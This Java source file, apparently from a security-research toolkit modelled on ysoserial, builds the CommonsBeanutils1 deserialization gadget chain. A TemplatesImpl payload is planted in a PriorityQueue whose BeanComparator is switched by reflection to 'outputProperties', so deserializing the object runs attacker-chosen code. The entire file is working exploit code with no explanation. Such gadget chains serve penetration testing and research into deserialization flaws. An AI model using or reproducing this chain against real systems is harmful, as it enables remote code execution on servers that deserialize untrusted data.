package com.pacemrc.javasec.Gadgets;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class CB1 {

    public static Object getObj(Class<?> cls) throws Exception {

        TemplatesImpl templates = Payload.getTemplatesImpl(cls);
        BeanComparator comparator = new BeanComparator("lowestSetBit");

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        priorityQueue.add(new BigInteger("1"));
        priorityQueue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "outputProperties");

        Object[] queueArray = (Object[]) Reflections.getFieldValue(priorityQueue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return priorityQueue;
    }
}
